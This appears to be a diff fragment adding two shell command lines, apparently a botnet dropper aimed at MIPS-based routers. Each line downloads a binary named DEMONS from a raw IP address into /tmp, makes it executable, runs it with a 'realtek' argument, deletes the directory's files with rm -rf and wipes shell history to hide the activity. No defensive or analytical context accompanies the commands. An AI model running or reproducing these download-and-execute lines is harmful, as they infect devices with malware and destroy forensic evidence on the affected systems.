@@ -1,0 +1,2 @@
+cd /tmp; wget http://2.56.8.156/bins/DEMONS.mips; chmod 777 *;./DEMONS.mips realtek.mips;rm -rf *;history -w;history -c
+cd /tmp; wget http://2.56.8.156/bins/DEMONS.mpsl; chmod 777 *;./DEMONS.mpsl realtek.mpsl;rm -rf *;history -w;history -c
